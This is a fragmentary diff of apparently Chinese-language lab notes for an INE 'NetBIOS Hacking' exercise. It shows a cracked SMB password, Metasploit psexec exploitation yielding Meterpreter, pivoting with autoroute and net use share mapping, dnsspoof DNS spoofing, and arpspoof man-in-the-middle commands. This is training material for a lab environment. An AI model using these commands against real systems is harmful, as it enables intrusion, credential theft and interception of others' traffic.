@@ -1,6 +1,6 @@
 # NetBIOS Hacking
 	=> SMB http://demo.ine.local and http://demo1.ine.local
-
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ping demo.ine.local
 		64 bytes from demo.ine.local (10.0.24.78): icmp_seq=1 ttl=125 time=2.78 ms
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -32,7 +32,6 @@
 		[445][smb] host: demo.ine.local   login: root   password: elizabeth
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter 會話
 	msfconsole -q
 		use exploit/windows/smb/psexec
 		set RHOSTS demo.ine.local
@@ -51,10 +50,10 @@
 		Logged On Users : 1
 		Meterpreter     : x86/windows
 
-	cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	shell
-	ping 10.0.29.163
+		cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		shell
+		ping 10.0.29.163
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	新增路由並識別第二台機器服務 : 
 		run autoroute -s 10.0.29.163/20
@@ -95,7 +94,7 @@
 	使用「net」指令將共用磁碟機對應到機器 :
 		net use D: \\10.0.29.163\Documents
 		net use K: \\10.0.29.163\K$
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		dir D:
 		dir K:
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -162,21 +161,21 @@
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	建立一個包含假 dns 條目的文件，其中包含以下所有子網域 sportsfoo.com
-	echo "172.16.5.101 *.sportsfoo.com" > dns
+		echo "172.16.5.101 *.sportsfoo.com" > dns
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	運行網域解析欺騙: 
 	dnsspoof -i eth1 -f dns
 	
 	dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
-	=> 172.16.5.5.58461 > 8.8.4.4.53:  24184+ A? fileserver.sportsfoo.com
-	=> 172.16.5.5.55092 > 8.8.4.4.53:  3070+ A? fileserver.sportsfoo.com
+		=> 172.16.5.5.58461 > 8.8.4.4.53:  24184+ A? fileserver.sportsfoo.com
+		=> 172.16.5.5.55092 > 8.8.4.4.53:  3070+ A? fileserver.sportsfoo.com
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	啟用 IP 轉發: 
-	echo 1 > /proc/sys/net/ipv4/ip_forward
+		echo 1 > /proc/sys/net/ipv4/ip_forward
 	使用 ARP 欺騙技術啟動 MiTM 攻擊。我們的目標是毒害受害者之間的通信
-	arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
-	arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
+		arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
+		arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	與 meterpreter 會話互動
 	sessions
@@ -192,7 +191,7 @@
 	過濾器：http.response.code == 200
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Hypertext Transfer Protocol : Request URI
-	[Request URI: http://623start.site/?status=install]
+		[Request URI: http://623start.site/?status=install]
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	識別受感染的 Windows 用戶端，請專注於透過 HTTP 的流量
 	過濾器：http
